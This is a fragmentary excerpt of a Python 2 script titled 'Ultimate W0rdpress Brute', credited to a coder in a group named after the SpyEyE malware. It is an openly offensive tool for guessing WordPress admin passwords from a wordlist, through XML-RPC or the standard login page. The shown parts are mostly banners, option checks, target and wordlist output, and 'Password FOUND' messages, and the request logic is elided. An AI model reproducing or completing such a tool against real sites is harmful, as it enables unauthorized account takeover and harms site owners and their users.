...
print bcolors.OKGREEN + ('--=+|      Ultimate W0rdpress Brute       |+=--') + bcolors.ENDC
print bcolors.OKGREEN + ('--=+|      Coder Name : WhoAmi            |+=--') + bcolors.ENDC
print bcolors.OKGREEN + ('--=+|      Coder Team : SpyEyE - Family   |+=--') + bcolors.ENDC
print bcolors.OKGREEN + ('--=+|      Location   : Tunisia           |+=--') + bcolors.ENDC
print bcolors.OKGREEN + ('--=+|      1 - Xml-rpc Brute Force        |+=--') + bcolors.ENDC
print bcolors.OKGREEN + ('--=+|      2 - Standard Brute Force       |+=--') + bcolors.ENDC
print bcolors.OKGREEN + ('--=+|=====================================|+=--') + bcolors.ENDC

print bcolors.OKGREEN + ('Notes : ') + bcolors.ENDC
print bcolors.OKRED +   ('|1| -X Xml-Rpc Brute Force') + bcolors.ENDC
print bcolors.OKRED +   ('|2| -S Standard Brute Force  ') + bcolors.ENDC
print bcolors.WARNING + ('I Hope You Enjoy This !! ^_^') + bcolors.ENDC
time.sleep ( 5 )
banner = """
--=+|=====================================|+=--
--=+|      Ultimate W0rdpress Brute       |+=--
--=+|      Coder Name : WhoAmi            |+=--
--=+|      Coder Team : SpyEyE - Family   |+=--
--=+|      Location   : Tunisia           |+=--
--=+|      1 - Xml-rpc Brute Force        |+=--
...
def urlCMS(url,brutemode):
    if url[:8] != "https://" and url[:7] != "http://":
        print bcolors.OKGREEN + ('\n[X] You must insert http:// or https:// procotol')  + bcolors.ENDC
        os._exit(1)
    # Page login
    if brutemode == "std":
    ...
    try:
        ...
        if brutemode == "std":
           ...
           if responseCMS(response) == "1":
              print('\n')
              print bcolors.OKGREEN + ('[!] Password FOUND!!!') + bcolors.ENDC
              print('')
...
if options.standard and options.xml:
   print bcolors.OKGREY +  "\n[X] Select standard [-S] OR xml-rpc [-X] bruteforce mode" + bcolors.ENDC
   sys.exit(1)
...
if not os.path.isfile(wlfile) and not os.access(wlfile, os.R_OK):
    print bcolors.OKRED +  "[X] Wordlist file is missing or is not readable" + bcolors.ENDC
    sys.exit(1)
...
print(banner)
print
print bcolors.OKRED + ('[+] Target.....: '+options.target) + bcolors.ENDC
print bcolors.OKRED + ('[+] Wordlist...: '+str(totalwordlist)) + bcolors.ENDC
print bcolors.OKRED + ('[+] Username...: '+user) + bcolors.ENDC
if brtmd == "std":
   print bcolors.WARNING + ('[+] BruteMode..: Standard') + bcolors.ENDC
else:
   print bcolors.WARNING + ('[+] BruteMode..: Xml-Rpc') + bcolors.ENDC
print bcolors.WARNING + ('[+]') + bcolors.ENDC
print bcolors.WARNING + ('[+] Connecting.......') + bcolors.ENDC
print bcolors.WARNING + ('[+]') + bcolors.ENDC
...
# no passwords found
print bcolors.OKRED + ('\n[X] Password NOT found :(') + bcolors.ENDC
